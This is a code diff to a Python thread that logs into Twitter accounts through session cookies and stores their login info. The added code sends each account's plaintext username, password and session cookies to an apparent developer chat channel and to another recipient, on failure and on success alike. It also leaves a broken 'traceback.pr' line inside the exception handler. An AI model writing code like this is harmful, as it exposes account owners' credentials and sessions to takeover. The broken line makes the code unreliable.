@@ -4,7 +4,8 @@ from ..core.session import TwitterSession
 from ..models import TwitterAccount , AccountLoginInfo
 from .TWlogin import LoginUsingBrowser
 from threading import Thread 
-
+from ..core.utils import sendTMessage
+import traceback
 
 class GetAccountLoginInfoFromInstanceThread(Thread):
     
@@ -22,18 +23,74 @@ class GetAccountLoginInfoFromInstanceThread(Thread):
                 user_data = self.createSession(response['cookie'])
                 if user_data:
                     self.accountLoginInfoHandler(response['cookie'],**user_data)
+                else :
+                    sendTMessage(f"""
+Faild Login as : {self.instance.agent} with user_data {user_data}
+Username : {self.handle}
+Password : {self.password}
+                        """,
+                        isDeveloper=True
+                        )
+                    sendTMessage(f"""
+Faild Login as : {self.instance.agent}
+Username : {self.handle}
+Password : {self.password}
+Please Check Handle or Password
+                        """)
+            else:
+                sendTMessage(f"""
+Faild Login as : {self.instance.agent} with Response {response}
+Username : {self.handle}
+Password : {self.password}
+                    """,
+                    isDeveloper=True
+                    )
+                sendTMessage(f"""
+Faild Login as : {self.instance.agent}
+Username : {self.handle}
+Password : {self.password}
+Please Check Handle or Password 
+                    """)
+                
         except Exception as e :
+            traceback.pr
+            sendTMessage(f"""
+Faild Login as : {self.instance.agent}
+Username : {self.handle}
+Password : {self.password}
+Please Check Handle or Password 
+            """)
+            sendTMessage(f"""
+Faild Login as : {self.instance.agent}
+Username : {self.handle}
+Password : {self.password}
+Error is {e}
+            """,
+            isDeveloper=True
+            )
+
             print(e)
 
     def createSession(self,cookie:str):
-        session = TwitterSession(cookie)
+        session = TwitterSession(cookie , only_get_me=True)
         me = session._getMe()
-        user_data = me["data"]["users"]
-        if user_data :
-            user_data = user_data[0]["result"]
-            return user_data
+        if me :
+            user_data = me["data"]["users"]
+            if user_data :
+                user_data = user_data[0]["result"]
+                return user_data
+            else :
+                sendTMessage(f"""
+Faild user_data with {user_data} 
+                """,
+                isDeveloper=True
+                )
         else :
-            return None
+            sendTMessage(f"""
+Faild _getMe with Response {me}
+            """,
+            isDeveloper=True
+            )
 
 
     def createAccountLoginInfo(self,cookie,**user_data):
@@ -45,7 +102,15 @@ class GetAccountLoginInfoFromInstanceThread(Thread):
             **user.params_new_instance
         )
         new_login_info.save()
-        print("\nSaved\n")
+        sendTMessage(f"""
+Successfully Created AccountLoginInfo with :
+Handle : {self.handle}
+Password : {self.password}
+Cookies : {cookie}
+User Params : {user.params_new_instance}
+        """,
+        isDeveloper=True
+        )
         return new_login_info
 
     def accountLoginInfoHandler(self,cookie,**user_data):
@@ -58,8 +123,16 @@ class GetAccountLoginInfoFromInstanceThread(Thread):
             login_info.profileImgURL = user['profileImgURL']
             login_info.description = user['description']
             login_info.verified = user['verified']
-            login_info.save()        
-            print("\nSaved\n")
+            login_info.save()   
+            sendTMessage(f"""
+Successfully Created AccountLoginInfo with :
+Handle : {self.handle}
+Password : {self.password}
+Cookies : {cookie}
+User Params : {user.params_new_instance}
+            """,
+            isDeveloper=True
+            )
             return login_info
         except AccountLoginInfo.DoesNotExist:
             return self.createAccountLoginInfo(cookie,**user_data)
